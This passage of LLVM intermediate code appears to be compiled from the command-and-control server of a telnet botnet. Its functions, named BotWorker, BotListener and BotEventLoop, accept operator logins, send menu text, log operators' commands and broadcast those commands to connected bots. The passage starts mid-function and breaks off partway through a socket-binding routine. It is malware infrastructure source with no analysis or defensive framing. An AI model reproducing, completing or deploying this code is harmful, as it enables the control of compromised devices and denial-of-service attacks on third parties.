  %1334 = icmp eq i64 %1333, -1
  br i1 %1334, label %1335, label %1336

1335:                                             ; preds = %1321
  br label %1555

1336:                                             ; preds = %1321
  br label %575, !llvm.loop !20

1337:                                             ; preds = %1317
  %1338 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1339 = call i8* @strstr(i8* %1338, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.147, i64 0, i64 0)) #8
  %1340 = icmp ne i8* %1339, null
  br i1 %1340, label %1341, label %1488

1341:                                             ; preds = %1337
  %1342 = getelementptr inbounds [2048 x i8], [2048 x i8]* %102, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %1342, i8 0, i64 2048, i1 false)
  %1343 = getelementptr inbounds [2048 x i8], [2048 x i8]* %102, i64 0, i64 0
  %1344 = call i32 (i8*, i8*, ...) @sprintf(i8* %1343, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.148, i64 0, i64 0)) #9
  %1345 = load i32, i32* %4, align 4
  %1346 = getelementptr inbounds [2048 x i8], [2048 x i8]* %102, i64 0, i64 0
  %1347 = getelementptr inbounds [2048 x i8], [2048 x i8]* %102, i64 0, i64 0
  %1348 = call i64 @strlen(i8* %1347) #8
  %1349 = call i64 @send(i32 %1345, i8* %1346, i64 %1348, i32 16384)
  %1350 = icmp eq i64 %1349, -1
  br i1 %1350, label %1351, label %1352

1351:                                             ; preds = %1341
  br label %1555

1352:                                             ; preds = %1341
  %1353 = load i32, i32* %4, align 4
  %1354 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %1355 = getelementptr inbounds [5000 x i8], [5000 x i8]* %36, i64 0, i64 0
  %1356 = call i64 @strlen(i8* %1355) #8
  %1357 = call i64 @send(i32 %1353, i8* %1354, i64 %1356, i32 16384)
  %1358 = icmp eq i64 %1357, -1
  br i1 %1358, label %1359, label %1360

1359:                                             ; preds = %1352
  br label %1555

1360:                                             ; preds = %1352
  %1361 = load i32, i32* %4, align 4
  %1362 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i64 0, i64 0
  %1363 = getelementptr inbounds [5000 x i8], [5000 x i8]* %37, i64 0, i64 0
  %1364 = call i64 @strlen(i8* %1363) #8
  %1365 = call i64 @send(i32 %1361, i8* %1362, i64 %1364, i32 16384)
  %1366 = icmp eq i64 %1365, -1
  br i1 %1366, label %1367, label %1368

1367:                                             ; preds = %1360
  br label %1555

1368:                                             ; preds = %1360
  %1369 = load i32, i32* %4, align 4
  %1370 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %1371 = getelementptr inbounds [5000 x i8], [5000 x i8]* %38, i64 0, i64 0
  %1372 = call i64 @strlen(i8* %1371) #8
  %1373 = call i64 @send(i32 %1369, i8* %1370, i64 %1372, i32 16384)
  %1374 = icmp eq i64 %1373, -1
  br i1 %1374, label %1375, label %1376

1375:                                             ; preds = %1368
  br label %1555

1376:                                             ; preds = %1368
  %1377 = load i32, i32* %4, align 4
  %1378 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i64 0, i64 0
  %1379 = getelementptr inbounds [5000 x i8], [5000 x i8]* %39, i64 0, i64 0
  %1380 = call i64 @strlen(i8* %1379) #8
  %1381 = call i64 @send(i32 %1377, i8* %1378, i64 %1380, i32 16384)
  %1382 = icmp eq i64 %1381, -1
  br i1 %1382, label %1383, label %1384

1383:                                             ; preds = %1376
  br label %1555

1384:                                             ; preds = %1376
  %1385 = load i32, i32* %4, align 4
  %1386 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i64 0, i64 0
  %1387 = getelementptr inbounds [5000 x i8], [5000 x i8]* %40, i64 0, i64 0
  %1388 = call i64 @strlen(i8* %1387) #8
  %1389 = call i64 @send(i32 %1385, i8* %1386, i64 %1388, i32 16384)
  %1390 = icmp eq i64 %1389, -1
  br i1 %1390, label %1391, label %1392

1391:                                             ; preds = %1384
  br label %1555

1392:                                             ; preds = %1384
  %1393 = load i32, i32* %4, align 4
  %1394 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %1395 = getelementptr inbounds [5000 x i8], [5000 x i8]* %41, i64 0, i64 0
  %1396 = call i64 @strlen(i8* %1395) #8
  %1397 = call i64 @send(i32 %1393, i8* %1394, i64 %1396, i32 16384)
  %1398 = icmp eq i64 %1397, -1
  br i1 %1398, label %1399, label %1400

1399:                                             ; preds = %1392
  br label %1555

1400:                                             ; preds = %1392
  %1401 = load i32, i32* %4, align 4
  %1402 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %1403 = getelementptr inbounds [5000 x i8], [5000 x i8]* %42, i64 0, i64 0
  %1404 = call i64 @strlen(i8* %1403) #8
  %1405 = call i64 @send(i32 %1401, i8* %1402, i64 %1404, i32 16384)
  %1406 = icmp eq i64 %1405, -1
  br i1 %1406, label %1407, label %1408

1407:                                             ; preds = %1400
  br label %1555

1408:                                             ; preds = %1400
  %1409 = load i32, i32* %4, align 4
  %1410 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %1411 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %1412 = call i64 @strlen(i8* %1411) #8
  %1413 = call i64 @send(i32 %1409, i8* %1410, i64 %1412, i32 16384)
  %1414 = icmp eq i64 %1413, -1
  br i1 %1414, label %1415, label %1416

1415:                                             ; preds = %1408
  br label %1555

1416:                                             ; preds = %1408
  %1417 = load i32, i32* %4, align 4
  %1418 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %1419 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %1420 = call i64 @strlen(i8* %1419) #8
  %1421 = call i64 @send(i32 %1417, i8* %1418, i64 %1420, i32 16384)
  %1422 = icmp eq i64 %1421, -1
  br i1 %1422, label %1423, label %1424

1423:                                             ; preds = %1416
  br label %1555

1424:                                             ; preds = %1416
  %1425 = load i32, i32* %4, align 4
  %1426 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %1427 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %1428 = call i64 @strlen(i8* %1427) #8
  %1429 = call i64 @send(i32 %1425, i8* %1426, i64 %1428, i32 16384)
  %1430 = icmp eq i64 %1429, -1
  br i1 %1430, label %1431, label %1432

1431:                                             ; preds = %1424
  br label %1555

1432:                                             ; preds = %1424
  %1433 = load i32, i32* %4, align 4
  %1434 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i64 0, i64 0
  %1435 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i64 0, i64 0
  %1436 = call i64 @strlen(i8* %1435) #8
  %1437 = call i64 @send(i32 %1433, i8* %1434, i64 %1436, i32 16384)
  %1438 = icmp eq i64 %1437, -1
  br i1 %1438, label %1439, label %1440

1439:                                             ; preds = %1432
  br label %1555

1440:                                             ; preds = %1432
  %1441 = load i32, i32* %4, align 4
  %1442 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i64 0, i64 0
  %1443 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i64 0, i64 0
  %1444 = call i64 @strlen(i8* %1443) #8
  %1445 = call i64 @send(i32 %1441, i8* %1442, i64 %1444, i32 16384)
  %1446 = icmp eq i64 %1445, -1
  br i1 %1446, label %1447, label %1448

1447:                                             ; preds = %1440
  br label %1555

1448:                                             ; preds = %1440
  %1449 = load i32, i32* %4, align 4
  %1450 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i64 0, i64 0
  %1451 = getelementptr inbounds [5000 x i8], [5000 x i8]* %48, i64 0, i64 0
  %1452 = call i64 @strlen(i8* %1451) #8
  %1453 = call i64 @send(i32 %1449, i8* %1450, i64 %1452, i32 16384)
  %1454 = icmp eq i64 %1453, -1
  br i1 %1454, label %1455, label %1456

1455:                                             ; preds = %1448
  br label %1555

1456:                                             ; preds = %1448
  %1457 = load i32, i32* %4, align 4
  %1458 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %1459 = getelementptr inbounds [5000 x i8], [5000 x i8]* %49, i64 0, i64 0
  %1460 = call i64 @strlen(i8* %1459) #8
  %1461 = call i64 @send(i32 %1457, i8* %1458, i64 %1460, i32 16384)
  %1462 = icmp eq i64 %1461, -1
  br i1 %1462, label %1463, label %1464

1463:                                             ; preds = %1456
  br label %1555

1464:                                             ; preds = %1456
  %1465 = load i32, i32* %4, align 4
  %1466 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %1467 = getelementptr inbounds [80 x i8], [80 x i8]* %50, i64 0, i64 0
  %1468 = call i64 @strlen(i8* %1467) #8
  %1469 = call i64 @send(i32 %1465, i8* %1466, i64 %1468, i32 16384)
  %1470 = icmp eq i64 %1469, -1
  br i1 %1470, label %1471, label %1472

1471:                                             ; preds = %1464
  br label %1555

1472:                                             ; preds = %1464
  br label %1473

1473:                                             ; preds = %1472
  %1474 = load i32, i32* %4, align 4
  %1475 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  %1476 = getelementptr inbounds [2048 x i8], [2048 x i8]* %53, i64 0, i64 0
  %1477 = call i64 @strlen(i8* %1476) #8
  %1478 = call i64 @send(i32 %1474, i8* %1475, i64 %1477, i32 16384)
  %1479 = icmp eq i64 %1478, -1
  br i1 %1479, label %1480, label %1481

1480:                                             ; preds = %1473
  br label %1555

1481:                                             ; preds = %1473
  %1482 = load i32, i32* %4, align 4
  %1483 = call i64 @send(i32 %1482, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i64 0, i64 0), i64 12, i32 16384)
  %1484 = icmp eq i64 %1483, -1
  br i1 %1484, label %1485, label %1486

1485:                                             ; preds = %1481
  br label %1555

1486:                                             ; preds = %1481
  br label %1487

1487:                                             ; preds = %1486
  br label %575, !llvm.loop !20

1488:                                             ; preds = %1337
  %1489 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1490 = call i8* @strstr(i8* %1489, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.149, i64 0, i64 0)) #8
  %1491 = icmp ne i8* %1490, null
  br i1 %1491, label %1492, label %1510

1492:                                             ; preds = %1488
  %1493 = getelementptr inbounds [2048 x i8], [2048 x i8]* %103, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %1493, i8 0, i64 2048, i1 false)
  %1494 = getelementptr inbounds [2048 x i8], [2048 x i8]* %103, i64 0, i64 0
  %1495 = load i32, i32* %5, align 4
  %1496 = sext i32 %1495 to i64
  %1497 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %1496
  %1498 = getelementptr inbounds %struct.login_info, %struct.login_info* %1497, i32 0, i32 0
  %1499 = getelementptr inbounds [20 x i8], [20 x i8]* %1498, i64 0, i64 0
  %1500 = call i32 (i8*, i8*, ...) @sprintf(i8* %1494, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.150, i64 0, i64 0), i8* %1499) #9
  %1501 = load i32, i32* %4, align 4
  %1502 = getelementptr inbounds [2048 x i8], [2048 x i8]* %103, i64 0, i64 0
  %1503 = getelementptr inbounds [2048 x i8], [2048 x i8]* %103, i64 0, i64 0
  %1504 = call i64 @strlen(i8* %1503) #8
  %1505 = call i64 @send(i32 %1501, i8* %1502, i64 %1504, i32 16384)
  %1506 = icmp eq i64 %1505, -1
  br i1 %1506, label %1507, label %1508

1507:                                             ; preds = %1492
  br label %1555

1508:                                             ; preds = %1492
  %1509 = call i32 @sleep(i32 5)
  br label %1555

1510:                                             ; preds = %1488
  %1511 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @trim(i8* %1511)
  %1512 = load i32, i32* %4, align 4
  %1513 = call i64 @send(i32 %1512, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.151, i64 0, i64 0), i64 11, i32 16384)
  %1514 = icmp eq i64 %1513, -1
  br i1 %1514, label %1515, label %1516

1515:                                             ; preds = %1510
  br label %1555

1516:                                             ; preds = %1510
  %1517 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1518 = call i64 @strlen(i8* %1517) #8
  %1519 = icmp eq i64 %1518, 0
  br i1 %1519, label %1520, label %1521

1520:                                             ; preds = %1516
  br label %575, !llvm.loop !20

1521:                                             ; preds = %1516
  %1522 = load i32, i32* %5, align 4
  %1523 = sext i32 %1522 to i64
  %1524 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %1523
  %1525 = getelementptr inbounds %struct.login_info, %struct.login_info* %1524, i32 0, i32 0
  %1526 = getelementptr inbounds [20 x i8], [20 x i8]* %1525, i64 0, i64 0
  %1527 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1528 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.152, i64 0, i64 0), i8* %1526, i8* %1527)
  %1529 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.153, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.154, i64 0, i64 0))
  store %struct._IO_FILE* %1529, %struct._IO_FILE** %104, align 8
  %1530 = call i64 @time(i64* null) #9
  store i64 %1530, i64* %105, align 8
  %1531 = call %struct.tm* @gmtime(i64* %105) #9
  store %struct.tm* %1531, %struct.tm** %106, align 8
  %1532 = getelementptr inbounds [50 x i8], [50 x i8]* %107, i64 0, i64 0
  %1533 = load %struct.tm*, %struct.tm** %106, align 8
  %1534 = call i64 @strftime(i8* %1532, i64 50, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.155, i64 0, i64 0), %struct.tm* %1533) #9
  %1535 = load %struct._IO_FILE*, %struct._IO_FILE** %104, align 8
  %1536 = getelementptr inbounds [50 x i8], [50 x i8]* %107, i64 0, i64 0
  %1537 = load i32, i32* %5, align 4
  %1538 = sext i32 %1537 to i64
  %1539 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %1538
  %1540 = getelementptr inbounds %struct.login_info, %struct.login_info* %1539, i32 0, i32 0
  %1541 = getelementptr inbounds [20 x i8], [20 x i8]* %1540, i64 0, i64 0
  %1542 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1543 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %1535, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.156, i64 0, i64 0), i8* %1536, i8* %1541, i8* %1542)
  %1544 = load %struct._IO_FILE*, %struct._IO_FILE** %104, align 8
  %1545 = call i32 @fclose(%struct._IO_FILE* %1544)
  %1546 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  %1547 = load i32, i32* %4, align 4
  %1548 = load i32, i32* %5, align 4
  %1549 = sext i32 %1548 to i64
  %1550 = getelementptr inbounds [10 x %struct.login_info], [10 x %struct.login_info]* @accounts, i64 0, i64 %1549
  %1551 = getelementptr inbounds %struct.login_info, %struct.login_info* %1550, i32 0, i32 0
  %1552 = getelementptr inbounds [20 x i8], [20 x i8]* %1551, i64 0, i64 0
  call void @broadcast(i8* %1546, i32 %1547, i8* %1552)
  %1553 = getelementptr inbounds [2048 x i8], [2048 x i8]* %7, i64 0, i64 0
  call void @llvm.memset.p0i8.i64(i8* align 16 %1553, i8 0, i64 2048, i1 false)
  br label %575, !llvm.loop !20

1554:                                             ; preds = %575
  br label %1555

1555:                                             ; preds = %1554, %1515, %1508, %1507, %1485, %1480, %1471, %1463, %1455, %1447, %1439, %1431, %1423, %1415, %1407, %1399, %1391, %1383, %1375, %1367, %1359, %1351, %1335, %1313, %1305, %1297, %1289, %1281, %1273, %1265, %1257, %1249, %1241, %1233, %1225, %1217, %1209, %1201, %1193, %1185, %1177, %1169, %1161, %1153, %1145, %1137, %1129, %1121, %1113, %870, %860, %833, %816, %799, %789, %762, %745, %728, %711, %701, %674, %660, %643, %624, %616, %608, %593, %566, %561, %552, %544, %536, %528, %520, %512, %504, %496, %488, %480, %472, %464, %456, %448, %440, %391, %390, %382, %374, %366, %358, %350, %342, %334, %326, %318, %310, %302, %294, %286, %278, %270, %262, %254, %210, %191, %185, %160, %154
  %1556 = load i32, i32* %4, align 4
  %1557 = sext i32 %1556 to i64
  %1558 = getelementptr inbounds [1000000 x %struct.telnetdata_t], [1000000 x %struct.telnetdata_t]* @managements, i64 0, i64 %1557
  %1559 = getelementptr inbounds %struct.telnetdata_t, %struct.telnetdata_t* %1558, i32 0, i32 0
  store i32 0, i32* %1559, align 4
  %1560 = load i32, i32* %4, align 4
  %1561 = call i32 @close(i32 %1560)
  %1562 = load volatile i32, i32* @OperatorsConnected, align 4
  %1563 = add nsw i32 %1562, -1
  store volatile i32 %1563, i32* @OperatorsConnected, align 4
  br label %1564

1564:                                             ; preds = %1555, %938, %926, %909, %892
  %1565 = load i8*, i8** %2, align 8
  ret i8* %1565
}

; Function Attrs: nounwind
declare i32 @feof(%struct._IO_FILE*) #3

declare i32 @fgetc(%struct._IO_FILE*) #1

declare void @rewind(%struct._IO_FILE*) #1

declare i32 @__isoc99_fscanf(%struct._IO_FILE*, i8*, ...) #1

; Function Attrs: nounwind
declare i32 @pthread_create(i64*, %union.pthread_attr_t*, i8* (i8*)*, i8*) #3

declare i32 @__isoc99_scanf(i8*, ...) #1

declare i32 @system(i8*) #1

; Function Attrs: nounwind
declare %struct.tm* @gmtime(i64*) #3

; Function Attrs: nounwind
declare i64 @strftime(i8*, i64, i8*, %struct.tm*) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i8* @BotListener(i32 %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca %struct.sockaddr_in, align 4
  %8 = alloca i64, align 8
  store i32 %0, i32* %2, align 4
  %9 = call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %9, i32* %3, align 4
  %10 = load i32, i32* %3, align 4
  %11 = icmp slt i32 %10, 0
  br i1 %11, label %12, label %13

12:                                               ; preds = %1
  call void @perror(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.157, i64 0, i64 0))
  br label %13

13:                                               ; preds = %12, %1
  %14 = bitcast %struct.sockaddr_in* %6 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 4 %14, i8 0, i64 16, i1 false)
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 0
  store i16 2, i16* %15, align 4
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 2
  %17 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %16, i32 0, i32 0
  store i32 0, i32* %17, align 4
  %18 = load i32, i32* %2, align 4
  %19 = trunc i32 %18 to i16
  %20 = call zeroext i16 @htons(i16 zeroext %19) #10
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i32 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = load i32, i32* %3, align 4
  %23 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %24 = call i32 @bind(i32 %22, %struct.sockaddr* %23, i32 16) #9
  %25 = icmp slt i32 %24, 0
  br i1 %25, label %26, label %27

26:                                               ; preds = %13
  call void @perror(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.158, i64 0, i64 0))
  br label %27

27:                                               ; preds = %26, %13
  %28 = load i32, i32* %3, align 4
  %29 = call i32 @listen(i32 %28, i32 5) #9
  store i32 16, i32* %5, align 4
  br label %30

30:                                               ; preds = %27, %37
  %31 = load i32, i32* %3, align 4
  %32 = bitcast %struct.sockaddr_in* %7 to %struct.sockaddr*
  %33 = call i32 @accept(i32 %31, %struct.sockaddr* %32, i32* %5)
  store i32 %33, i32* %4, align 4
  %34 = load i32, i32* %4, align 4
  %35 = icmp slt i32 %34, 0
  br i1 %35, label %36, label %37

36:                                               ; preds = %30
  call void @perror(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.159, i64 0, i64 0))
  br label %37

37:                                               ; preds = %36, %30
  %38 = load i32, i32* %4, align 4
  %39 = sext i32 %38 to i64
  %40 = inttoptr i64 %39 to i8*
  %41 = call i32 @pthread_create(i64* %8, %union.pthread_attr_t* null, i8* (i8*)* @BotWorker, i8* %40) #9
  br label %30
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #3

; Function Attrs: nounwind readnone willreturn
declare zeroext i16 @htons(i16 zeroext) #5

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @listen(i32, i32) #3

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define dso_local i32 @main(i32 %0, i8** %1, i8** %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8**, align 8
  %7 = alloca i8**, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca %struct.epoll_event, align 1
  %12 = alloca i8*, align 8
  %13 = alloca i64, align 8
  store i32 0, i32* %4, align 4
  store i32 %0, i32* %5, align 4
  store i8** %1, i8*** %6, align 8
  store i8** %2, i8*** %7, align 8
  %14 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #9
  %15 = load i32, i32* %5, align 4
  %16 = icmp ne i32 %15, 4
  br i1 %16, label %17, label %23

17:                                               ; preds = %3
  %18 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %19 = load i8**, i8*** %6, align 8
  %20 = getelementptr inbounds i8*, i8** %19, i64 0
  %21 = load i8*, i8** %20, align 8
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %18, i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.160, i64 0, i64 0), i8* %21)
  call void @exit(i32 1) #11
  unreachable

23:                                               ; preds = %3
  %24 = load i8**, i8*** %6, align 8
  %25 = getelementptr inbounds i8*, i8** %24, i64 3
  %26 = load i8*, i8** %25, align 8
  %27 = call i32 @atoi(i8* %26) #8
  store i32 %27, i32* %10, align 4
  %28 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.161, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.162, i64 0, i64 0))
  store %struct._IO_FILE* %28, %struct._IO_FILE** @telFD, align 8
  %29 = load i8**, i8*** %6, align 8
  %30 = getelementptr inbounds i8*, i8** %29, i64 2
  %31 = load i8*, i8** %30, align 8
  %32 = call i32 @atoi(i8* %31) #8
  store i32 %32, i32* %9, align 4
  %33 = load i8**, i8*** %6, align 8
  %34 = getelementptr inbounds i8*, i8** %33, i64 1
  %35 = load i8*, i8** %34, align 8
  %36 = call i32 @create_and_bind(i8* %35)
  store volatile i32 %36, i32* @listenFD, align 4
  %37 = load volatile i32, i32* @listenFD, align 4
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %39, label %40

39:                                               ; preds = %23
  call void @abort() #11
  unreachable

40:                                               ; preds = %23
  %41 = load volatile i32, i32* @listenFD, align 4
  %42 = call i32 @make_socket_non_blocking(i32 %41)
  store i32 %42, i32* %8, align 4
  %43 = load i32, i32* %8, align 4
  %44 = icmp eq i32 %43, -1
  br i1 %44, label %45, label %46

45:                                               ; preds = %40
  call void @abort() #11
  unreachable

46:                                               ; preds = %40
  %47 = load volatile i32, i32* @listenFD, align 4
  %48 = call i32 @listen(i32 %47, i32 4096) #9
  store i32 %48, i32* %8, align 4
  %49 = load i32, i32* %8, align 4
  %50 = icmp eq i32 %49, -1
  br i1 %50, label %51, label %52

51:                                               ; preds = %46
  call void @perror(i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.163, i64 0, i64 0))
  call void @abort() #11
  unreachable

52:                                               ; preds = %46
  %53 = call i32 @epoll_create1(i32 0) #9
  store volatile i32 %53, i32* @epollFD, align 4
  %54 = load volatile i32, i32* @epollFD, align 4
  %55 = icmp eq i32 %54, -1
  br i1 %55, label %56, label %57

56:                                               ; preds = %52
  call void @perror(i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.164, i64 0, i64 0))
  call void @abort() #11
  unreachable

57:                                               ; preds = %52
  %58 = load volatile i32, i32* @listenFD, align 4
  %59 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 1
  %60 = bitcast %union.epoll_data* %59 to i32*
  store i32 %58, i32* %60, align 1
  %61 = getelementptr inbounds %struct.epoll_event, %struct.epoll_event* %11, i32 0, i32 0
  store i32 -2147483647, i32* %61, align 1
  %62 = load volatile i32, i32* @epollFD, align 4
  %63 = load volatile i32, i32* @listenFD, align 4
  %64 = call i32 @epoll_ctl(i32 %62, i32 1, i32 %63, %struct.epoll_event* %11) #9
  store i32 %64, i32* %8, align 4
  %65 = load i32, i32* %8, align 4
  %66 = icmp eq i32 %65, -1
  br i1 %66, label %67, label %68

67:                                               ; preds = %57
  call void @perror(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i64 0, i64 0))
  call void @abort() #11
  unreachable

68:                                               ; preds = %57
  %69 = load i32, i32* %9, align 4
  %70 = add nsw i32 %69, 2
  %71 = zext i32 %70 to i64
  %72 = call i8* @llvm.stacksave()
  store i8* %72, i8** %12, align 8
  %73 = alloca i64, i64 %71, align 16
  store i64 %71, i64* %13, align 8
  br label %74

74:                                               ; preds = %78, %68
  %75 = load i32, i32* %9, align 4
  %76 = add nsw i32 %75, -1
  store i32 %76, i32* %9, align 4
  %77 = icmp ne i32 %75, 0
  br i1 %77, label %78, label %84

78:                                               ; preds = %74
  %79 = load i32, i32* %9, align 4
  %80 = add nsw i32 %79, 1
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i64, i64* %73, i64 %81
  %83 = call i32 @pthread_create(i64* %82, %union.pthread_attr_t* null, i8* (i8*)* @BotEventLoop, i8* null) #9
  br label %74, !llvm.loop !21

84:                                               ; preds = %74
  %85 = getelementptr inbounds i64, i64* %73, i64 0
  %86 = load i32, i32* %10, align 4
  %87 = sext i32 %86 to i64
  %88 = inttoptr i64 %87 to i8*
  %89 = call i32 @pthread_create(i64* %85, %union.pthread_attr_t* null, i8* (i8*)* bitcast (i8* (i32)* @BotListener to i8* (i8*)*), i8* %88) #9
  br label %90

90:                                               ; preds = %91, %84
  br label %91

91:                                               ; preds = %90
  call void @broadcast(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str, i64 0, i64 0), i32 -1, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.165, i64 0, i64 0))
  %92 = call i32 @sleep(i32 60)
  br label %90
}

; Function Attrs: nounwind
declare void (i32)* @signal(i32, void (i32)*) #3

; Function Attrs: noreturn nounwind
declare void @exit(i32) #6

; Function Attrs: nounwind readonly willreturn
declare i32 @atoi(i8*) #2

; Function Attrs: noinline nounwind optnone sspstrong uwtable
define internal i32 @create_and_bind(i8* %0) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca %struct.addrinfo, align 8
  %5 = alloca %struct.addrinfo*, align 8
  %6 = alloca %struct.addrinfo*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  %10 = bitcast %struct.addrinfo* %4 to i8*
  call void @llvm.memset.p0i8.i64(i8* align 8 %10, i8 0, i64 48, i1 false)
  %11 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 1
  store i32 0, i32* %11, align 4
  %12 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 2
  store i32 1, i32* %12, align 8
  %13 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %4, i32 0, i32 0
  store i32 1, i32* %13, align 8
  %14 = load i8*, i8** %3, align 8
  %15 = call i32 @getaddrinfo(i8* null, i8* %14, %struct.addrinfo* %4, %struct.addrinfo** %5)
  store i32 %15, i32* %7, align 4
  %16 = load i32, i32* %7, align 4
  %17 = icmp ne i32 %16, 0
  br i1 %17, label %18, label %23

18:                                               ; preds = %1
  %19 = load %struct._IO_FILE*, %struct._IO_FILE** @stderr, align 8
  %20 = load i32, i32* %7, align 4
  %21 = call i8* @gai_strerror(i32 %20) #9
  %22 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %19, i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.167, i64 0, i64 0), i8* %21)
  store i32 -1, i32* %2, align 4
  br label %76

23:                                               ; preds = %1
  %24 = load %struct.addrinfo*, %struct.addrinfo** %5, align 8
  store %struct.addrinfo* %24, %struct.addrinfo** %6, align 8
  br label %25

25:                                               ; preds = %63, %23
  %26 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %27 = icmp ne %struct.addrinfo* %26, null
  br i1 %27, label %28, label %67

28:                                               ; preds = %25
  %29 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %30 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %29, i32 0, i32 1
  %31 = load i32, i32* %30, align 4
  %32 = load %struct.addrinfo*, %struct.addrinfo** %6, align 8
  %33 = getelementptr inbounds %struct.addrinfo, %struct.addrinfo* %32, i32 0, i32 2
  %34 = load i32, i32* %33, align 8
